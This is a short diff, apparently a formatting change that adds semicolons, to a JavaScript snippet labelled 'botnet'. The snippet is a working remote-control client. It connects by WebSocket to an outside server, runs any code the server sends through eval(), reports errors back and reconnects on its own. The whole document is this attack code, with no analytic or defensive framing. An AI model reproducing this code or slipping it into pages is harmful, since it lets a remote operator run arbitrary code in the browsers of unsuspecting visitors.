@@ -13,20 +13,20 @@
 var project = 'botnet';
 
 function u() {
-  window.ws = new WebSocket('wss://injectify.samdd.me/i?' + btoa(project))
+  window.ws = new WebSocket('wss://injectify.samdd.me/i?' + btoa(project));
   ws.onmessage = function(d) {
     try {
-      d = JSON.parse(d.data)
-      eval(d.d)
+      d = JSON.parse(d.data);
+      eval(d.d);
     } catch (e) {
       ws.send(JSON.stringify({
         t: 'e',
         d: e.stack,
-      }))
+      }));
     }
-  }
+  };
   ws.onclose = function() {
-    setTimeout(u, 3000)
-  }
+    setTimeout(u, 3000);
+  };
 }
-u()
+u();
